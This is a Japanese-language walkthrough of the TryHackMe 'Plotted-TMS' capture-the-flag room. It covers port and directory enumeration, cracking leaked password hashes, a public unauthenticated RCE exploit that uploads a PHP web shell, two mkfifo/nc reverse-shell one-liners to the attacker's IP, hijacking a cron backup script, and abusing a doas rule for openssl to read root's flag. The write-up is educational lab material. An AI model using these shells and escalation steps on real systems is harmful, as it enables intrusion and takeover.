# Plotted-TMS CTF

https://tryhackme.com/room/plottedtms

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.38.108
root@ip-10-10-253-163:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-21 23:40 GMT
Nmap scan report for 10.10.38.108
Host is up (0.00019s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
445/tcp open  microsoft-ds
MAC Address: 02:37:4A:7A:EF:41 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.94 seconds
root@ip-10-10-253-163:~# sudo nmap -sV -p22,80,445 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-21 23:40 GMT
Nmap scan report for 10.10.38.108
Host is up (0.00017s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:37:4A:7A:EF:41 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, 80,445 にHTTP

### gobuster

#### 80

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 30

/.php                 (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://10.10.38.108/admin/]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/passwd               (Status: 200) [Size: 25]
/server-status        (Status: 403) [Size: 277]
/shadow               (Status: 200) [Size: 25]
```

/admin/id_rsa

```
VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE
```

秘密鍵にしては短すぎる。Base64デコード。

```
Trust me it is not this easy..now get back to enumeration :D
```

/passwd, /shadow
```
bm90IHRoaXMgZWFzeSA6RA==
```

```
not this easy :D
```


#### 445

gobusterはまともに動作しなかった。  
dirbで大量に出てきた。

```shell
root@ip-10-10-253-163:~# dirb http://$TARGET

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Mar 22 00:14:25 2025
URL_BASE: http://10.10.38.108/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://10.10.38.108/ ----
                                                                                                                                                          ==> DIRECTORY: http://10.10.38.108/admin/
+ http://10.10.38.108/index.html (CODE:200|SIZE:10918)                      
+ http://10.10.38.108/passwd (CODE:200|SIZE:25)                             
+ http://10.10.38.108/server-status (CODE:403|SIZE:277)                     
+ http://10.10.38.108/shadow (CODE:200|SIZE:25)                             
                                                                            
---- Entering directory: http://10.10.38.108/admin/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Mar 22 00:14:52 2025
DOWNLOADED: 4612 - FOUND: 4
root@ip-10-10-253-163:~# dirb http://$TARGET:445

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Mar 22 00:15:55 2025
URL_BASE: http://10.10.38.108:445/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://10.10.38.108:445/ ----
                                                                             + http://10.10.38.108:445/index.html (CODE:200|SIZE:10918)                  
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/
+ http://10.10.38.108:445/server-status (CODE:403|SIZE:278)                 
                                                                            
---- Entering directory: http://10.10.38.108:445/management/ ----
                                                                                                                                                          ==> DIRECTORY: http://10.10.38.108:445/management/admin/
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/assets/
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/build/
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/classes/
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/database/
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/dist/
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/inc/
+ http://10.10.38.108:445/management/index.php (CODE:200|SIZE:14506)        
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/libs/
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/pages/
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/plugins/
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/uploads/
                                                                            
---- Entering directory: http://10.10.38.108:445/management/admin/ ----
                                                                                                                                                          ==> DIRECTORY: http://10.10.38.108:445/management/admin/drivers/
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/admin/inc/
+ http://10.10.38.108:445/management/admin/index.php (CODE:200|SIZE:22279)  
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/admin/maintenance/
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/admin/reports/
                                                                             ==> DIRECTORY: http://10.10.38.108:445/management/admin/user/
                                                                            
---- Entering directory: http://10.10.38.108:445/management/assets/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://10.10.38.108:445/management/build/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://10.10.38.108:445/management/classes/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://10.10.38.108:445/management/database/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://10.10.38.108:445/management/dist/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://10.10.38.108:445/management/inc/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://10.10.38.108:445/management/libs/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://10.10.38.108:445/management/pages/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://10.10.38.108:445/management/plugins/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://10.10.38.108:445/management/uploads/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://10.10.38.108:445/management/admin/drivers/ ----
                                                                             + http://10.10.38.108:445/management/admin/drivers/index.php (CODE:500|SIZE:0)
                                                                            
---- Entering directory: http://10.10.38.108:445/management/admin/inc/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://10.10.38.108:445/management/admin/maintenance/ ----
                                                                             + http://10.10.38.108:445/management/admin/maintenance/index.php (CODE:500|SIZE:0)
                                                                            
---- Entering directory: http://10.10.38.108:445/management/admin/reports/ ----
                                                                             + http://10.10.38.108:445/management/admin/reports/index.php (CODE:500|SIZE:0)
                                                                            
---- Entering directory: http://10.10.38.108:445/management/admin/user/ ----
                                                                             + http://10.10.38.108:445/management/admin/user/index.php (CODE:500|SIZE:0) 
                                                                               
-----------------
END_TIME: Sat Mar 22 00:18:48 2025
DOWNLOADED: 32284 - FOUND: 8
```

/management/database/traffic_offense_db.sql	

```sql
INSERT INTO `users` (`id`, `firstname`, `lastname`, `username`, `password`, `avatar`, `last_login`, `type`, `date_added`, `date_updated`) VALUES
(1, 'Adminstrator', 'Admin', 'admin', '0192023a7bbd73250516f069df18b500', 'uploads/1624240500_avatar.png', NULL, 1, '2021-01-20 14:02:37', '2021-06-21 09:55:07'),
(9, 'John', 'Smith', 'jsmith', '1254737c076cf867dc53d60a0364f38e', 'uploads/1629336240_avatar.jpg', NULL, 2, '2021-08-19 09:24:25', NULL);
```

両方クラックできるが、
http://10.10.38.108:445/management/admin/login.php でログインできない。

## Traffic Offense Management System

脆弱性検索

```
$ searchsploit Traffic Offense Management System
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Online Traffic Offense Management System 1.0 - 'id' SQL Injection (Authenticated)                                                                                                                         | php/webapps/50218.txt
Online Traffic Offense Management System 1.0 - Multiple RCE (Unauthenticated)                                                                                                                             | php/webapps/50389.txt
Online Traffic Offense Management System 1.0 - Multiple SQL Injection (Unauthenticated)                                                                                                                   | php/webapps/50387.txt
Online Traffic Offense Management System 1.0 - Multiple XSS (Unauthenticated)                                                                                                                             | php/webapps/50388.txt
Online Traffic Offense Management System 1.0 - Privilage escalation (Unauthenticated)                                                                                                                     | php/webapps/50392.txt
Online Traffic Offense Management System 1.0 - Remote Code Execution (RCE) (Unauthenticated)                                                                                                              | php/webapps/50221.py
Traffic Offense Management System 1.0 - Remote Code Execution (RCE) (Unauthenticated)                                                                                                                     | php/webapps/50244.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

実行

```shell
$ python2 ./50221.py                                      

Example: http://example.com

Url: http://10.10.38.108:445/management/
Check Url ...

[+] Bypass Login

[+] Upload Shell

[+] Exploit Done!

$ id      
Traceback (most recent call last):
  File "./50221.py", line 107, in <module>
    request = requests.post(find_shell.get("src") + "?cmd=" + cmd, data={'key':'value'}, headers=headers)
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/api.py", line 119, in post
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/api.py", line 61, in request
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/sessions.py", line 516, in request
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/sessions.py", line 459, in prepare_request
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/models.py", line 314, in prepare
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/models.py", line 388, in prepare_url
requests.exceptions.MissingSchema: Invalid URL '/management/uploads/1742604360_evil.php?cmd=id': No schema supplied. Perhaps you meant http:///management/uploads/1742604360_evil.php?cmd=id?
```

エラーが発生するが、PHPのアップロード自体は成功している。

リバースシェルをURLエンコードして送信

```shell
http://10.10.38.108:445/management/uploads/1742604360_evil.php?cmd=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%32%2e%32%32%2e%31%38%32%20%36%36%36%36%20%3e%2f%74%6d%70%2f%66
```

```shell
$ nc -nvlp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.38.108] 51608
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

シェル取得成功。

```shell
$ ls -al /home
total 16
drwxr-xr-x  4 root       root       4096 Oct 28  2021 .
drwxr-xr-x 20 root       root       4096 Oct 25  2021 ..
drwxr-xr-x  4 plot_admin plot_admin 4096 Oct 28  2021 plot_admin
drwxr-xr-x  4 ubuntu     ubuntu     4096 Oct 28  2021 ubuntu
$ ls -al /home/plot_admin
total 32
drwxr-xr-x  4 plot_admin plot_admin 4096 Oct 28  2021 .
drwxr-xr-x  4 root       root       4096 Oct 28  2021 ..
lrwxrwxrwx  1 root       root          9 Oct 28  2021 .bash_history -> /dev/null
-rw-r--r--  1 plot_admin plot_admin  220 Oct 28  2021 .bash_logout
-rw-r--r--  1 plot_admin plot_admin 3771 Oct 28  2021 .bashrc
drwxrwxr-x  3 plot_admin plot_admin 4096 Oct 28  2021 .local
-rw-r--r--  1 plot_admin plot_admin  807 Oct 28  2021 .profile
drwxrwx--- 14 plot_admin plot_admin 4096 Oct 28  2021 tms_backup
-rw-rw----  1 plot_admin plot_admin   33 Oct 28  2021 user.txt
```

plot_admin への昇格を目指す。

## 権限昇格１

オーナーファイル

```shell
www-data@plotted:/var/www/html/445/management/uploads$ find / -user plot_admin -type f 2>/dev/null
/var/www/scripts/backup.sh
/home/plot_admin/.bashrc
/home/plot_admin/.bash_logout
/home/plot_admin/user.txt
/home/plot_admin/.profile
```

```shell
www-data@plotted:/var/www/html/445/management/uploads$ ls -al /var/www/scripts/backup.sh
-rwxrwxr-- 1 plot_admin plot_admin 141 Oct 28  2021 /var/www/scripts/backup.sh

www-data@plotted:/var/www/html/445/management/uploads$ cat /var/www/scripts/backup.sh
#!/bin/bash

/usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup
/bin/chmod -R 770 /home/plot_admin/tms_backup/management
```

/var/www/html/management は存在しないパス。

```shell
www-data@plotted:/var/www/html/445/management/uploads$ ls -al /var/www/html
total 28
drwxr-xr-x 4 root     root      4096 Oct 28  2021 .
drwxr-xr-x 4 root     root      4096 Oct 28  2021 ..
drwxr-xr-x 3 www-data www-data  4096 Oct 28  2021 445
drwxr-xr-x 3 www-data www-data  4096 Oct 28  2021 80
-rw-r--r-- 1 root     root     10918 Oct 28  2021 index.html
```

```shell
www-data@plotted:/var/www/html/445/management/uploads$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   plot_admin /var/www/scripts/backup.sh
```

毎分実行されているが、直接悪用できそうな隙が見当たらない。  
managementディレクトリの中を調査する。

```shell
www-data@plotted:/var/www/html/445/management$ cat initialize.php 
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','/management/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"tms_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"Password@123");
if(!defined('DB_NAME')) define('DB_NAME',"tms_db");
?>
```

```shell
mysql> select * from users;
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                        | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | 14d147dc0ba2fed434e7fd176dc87fdc | uploads/1742604360_evil.php   | NULL       |    1 | 2021-01-20 14:02:37 | 2025-03-22 00:46:26 |
|  9 | Plotted      | User     | puser    | 1254737c076cf867dc53d60a0364f38e | uploads/1629336240_avatar.jpg | NULL       |    2 | 2021-08-19 09:24:25 | 2021-10-28 07:33:02 |
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+------+---------------------+---------------------+
2 rows in set (0.00 sec)
```

puser は jsmith123。admin は割れない。

```shell
www-data@plotted:/var/www/html/445/management$ ls -al /var/www/scripts/
total 12
drwxr-xr-x 2 www-data   www-data   4096 Oct 28  2021 .
drwxr-xr-x 4 root       root       4096 Oct 28  2021 ..
-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh
```

backup.sh に書き込み権限はないが、/var/www/scripts ディレクトリに全権限があるので、ファイルの差し替えが可能だった。

リバースシェルに差し替え

```shell
www-data@plotted:/var/www/scripts$ rm ./backup.sh
rm: remove write-protected regular file './backup.sh'? y
www-data@plotted:/var/www/scripts$ echo '#!/bin/bash' >> backup.sh
www-data@plotted:/var/www/scripts$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 6667 >/tmp/f' >> backup.sh
chmod +x ./backup.sh
```

リバースシェル取得成功。

```shell
$ nc -nvlp 6667
listening on [any] 6667 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.38.108] 60994
sh: 0: can't access tty; job control turned off
$ id
uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)
```

```shell
$ cat user.txt
............................
```

ユーザーフラグゲット。

## 権限昇格２

SUIDコマンドを探したら doas コマンドを発見した。

```shell
www-data@plotted:/var/www/html/445/management/uploads$ cat /etc/doas.conf
permit nopass plot_admin as root cmd openssl
```

plot_adminは、root として openssl を実行できる。

```shell
$ doas -u root openssl enc -in "/root/root.txt"
Congratulations on completing this room!

.......................

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms.
-sa.infinity8888
```

## 振り返り

- gobuster より dirb の方が適した場合もある。
- 権限昇格のスクリプトファイルは、ファイル自体の書き込みパーミッションだけでなく、ディレクトリの書き込みパーミッションも確認する必要がある。
